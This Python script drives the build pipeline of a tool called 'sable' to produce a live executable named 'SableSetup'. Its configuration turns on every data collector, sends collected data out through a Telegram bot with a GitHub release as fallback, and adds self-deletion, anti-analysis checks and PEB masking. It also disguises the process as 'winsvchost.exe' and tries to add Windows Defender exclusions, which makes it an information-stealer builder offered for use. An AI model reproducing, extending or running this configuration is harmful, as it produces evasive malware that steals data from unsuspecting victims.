"""Build the live VUURTH artifact through the real pipeline, not around it.

Same call the application makes: validate, payload, seal, forage, rename. The only
difference is the configuration, which comes from killywilly's ticket: Telegram
primary, GitHub release as the ordered fallback, every collector on, self-remove on,
Defender exclusions attempted.

    python tools/probes/live_vuurth.py
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

ROOT = Path(r"C:\Users\Kuzenee\Desktop\55555\sable")
sys.path.insert(0, str(ROOT))

from core import pipeline  # noqa: E402
from core.schema import (  # noqa: E402
    SCHEMA_VERSION,
    RelayConfig,
    RelayTarget,
    RunConfig,
    SourceConfig,
)

OUT = Path(r"C:\Users\Kuzenee\Desktop\55555\_harness\out")
STUB = ROOT / "tools" / "dist" / "sable-launcher.exe"

# Endpoints are ``kind$bind`` and both halves are credentials. They were literals while
# this probe ran for the first time, which is also why the first push was refused: a
# repository is the wrong home for a bot token and a PAT. They come in from the
# environment now, and the probe refuses rather than running against a guess.
TELEGRAM = os.environ.get("SABLE_PROBE_TELEGRAM", "")
PHANTOM = os.environ.get("SABLE_PROBE_PHANTOM", "")
if not TELEGRAM or not PHANTOM:
    raise SystemExit(
        "set SABLE_PROBE_TELEGRAM=<bot_token>$<chat_id> and "
        "SABLE_PROBE_PHANTOM=<owner>/<repo>$<token>, then run this probe"
    )

cfg = RunConfig(
    schema_version=SCHEMA_VERSION,
    mutex=r"Global\SableLiveVuurth",
    seal_key="SableVuurth-2026-11-22",
    relay=RelayConfig(
        kind="telegram",
        endpoint=TELEGRAM,
        mention="",
        targets=(RelayTarget(kind="phantom", endpoint=PHANTOM),),
    ),
    sources=SourceConfig(),
    self_remove=True,
    ballast_mb=0,
    keep_local=False,
    persist=False,
    raw_bundle=False,
    anti_analysis="abort",
    abort_on_uniform_capture=True,
    mask_peb=True,
    image_name="winsvchost.exe",
    defender_exclusion=True,
)


def _progress(event: pipeline.Event) -> None:
    print(f"  {event.stage:<9} {event.message}")


outcome = pipeline.run(
    cfg,
    root=ROOT,
    out_dir=OUT,
    name="SableSetup",
    stub=STUB,
    progress=_progress,
)

print()
print(f"artifact  {outcome.artifact}")
print(f"size      {outcome.size} bytes")
print(f"seconds   {outcome.seconds:.2f}")
print(f"seal key  {cfg.seal_key}")
